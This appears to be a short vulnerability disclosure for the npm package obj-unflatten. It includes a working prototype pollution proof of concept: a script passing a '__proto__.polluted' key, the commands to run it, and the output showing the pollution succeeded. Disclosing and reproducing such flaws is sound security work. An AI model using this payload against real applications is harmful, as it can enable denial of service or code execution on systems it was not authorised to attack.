# Description

`obj-unflatten` convert flatten objects in nested ones. This package is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:
```javascript
// poc.js
const unflatten = require('obj-unflatten')
console.log('Before: ' + {}.polluted)
unflatten({'__proto__.polluted': 'Prototype Polluted!'})
console.log('After: ' + {}.polluted)
```
2. Execute the following commands in the terminal:
```bash
npm i obj-unflatten # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: Prototype Polluted!
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.
